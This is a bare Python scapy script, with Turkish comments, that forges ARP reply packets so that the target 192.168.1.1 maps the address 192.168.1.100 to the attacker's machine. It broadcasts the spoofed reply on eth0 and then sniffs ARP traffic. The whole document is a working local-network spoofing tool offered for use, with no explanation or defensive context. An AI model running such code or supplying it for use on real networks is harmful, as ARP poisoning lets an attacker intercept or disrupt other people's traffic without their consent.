from scapy.all import ARP, Ether, srp, sendp, sniff

def arp_spoof(target_ip, spoof_ip):
    arp = ARP(op=2, pdst=target_ip, psrc=spoof_ip, hwdst="ff:ff:ff:ff:ff:ff")
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = ether/arp
    sendp(packet, iface="eth0", verbose=False)
    print(f"ARP Spoofing: Sent spoofed ARP packets to {target_ip} pretending to be {spoof_ip}")

def packet_callback(packet):
    if packet.haslayer(ARP) and packet[ARP].op == 2:  # ARP reply
        print(f"Received ARP packet: {packet.summary()}")

def start_arp_spoofing(target_ip, spoof_ip):
    arp_spoof(target_ip, spoof_ip)
    sniff(iface="eth0", prn=packet_callback, filter="arp", store=0)

if __name__ == "__main__":
    target_ip = "192.168.1.1"  # Hedef IP
    spoof_ip = "192.168.1.100"  # Spoof IP
    start_arp_spoofing(target_ip, spoof_ip)